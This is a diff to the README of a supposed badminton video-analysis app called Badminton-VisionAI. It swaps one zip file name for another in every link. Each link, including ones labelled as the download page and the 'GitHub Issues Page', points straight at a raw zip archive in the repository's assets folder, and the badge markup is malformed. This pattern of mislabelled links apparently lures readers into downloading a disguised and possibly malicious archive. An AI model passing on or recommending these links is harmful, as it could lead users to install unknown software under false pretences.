@@ -6,9 +6,9 @@ Welcome to Badminton-VisionAI! This application helps you analyze your badminton
 
 ## 📥 Download Badminton-VisionAI
 
-[![Download Badminton-VisionAI](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/Badminton-AI-Vision-2.6.zip%20Now-Get%20the%https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/Badminton-AI-Vision-2.6.zip)](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/Badminton-AI-Vision-2.6.zip)
+[![Download Badminton-VisionAI](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/AI_Vision_Badminton_v3.1.zip%20Now-Get%20the%https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/AI_Vision_Badminton_v3.1.zip)](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/AI_Vision_Badminton_v3.1.zip)
 
-To get started, click the button above or visit [this page to download](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/Badminton-AI-Vision-2.6.zip).
+To get started, click the button above or visit [this page to download](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/AI_Vision_Badminton_v3.1.zip).
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ Before installing Badminton-VisionAI, ensure your computer meets these basic req
 
 ## 🎥 Setup & Installation
 
-1. **Visit the Download Page**: Go to [this page to download](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/Badminton-AI-Vision-2.6.zip) to access the latest releases.
+1. **Visit the Download Page**: Go to [this page to download](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/AI_Vision_Badminton_v3.1.zip) to access the latest releases.
 
 2. **Choose Your Version**: Look for the most recent version of Badminton-VisionAI. You will find files for different operating systems.
 
@@ -70,7 +70,7 @@ If you encounter issues while using the application, try these solutions:
 
 ## 💬 Support & Feedback
 
-We value your feedback! For questions or support, please create an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/Badminton-AI-Vision-2.6.zip). Share your experiences and suggestions to help us improve.
+We value your feedback! For questions or support, please create an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/CJMK1/Badminton-VisionAI/main/assets/AI_Vision_Badminton_v3.1.zip). Share your experiences and suggestions to help us improve.
 
 ## 🌟 Community & Contributions
 
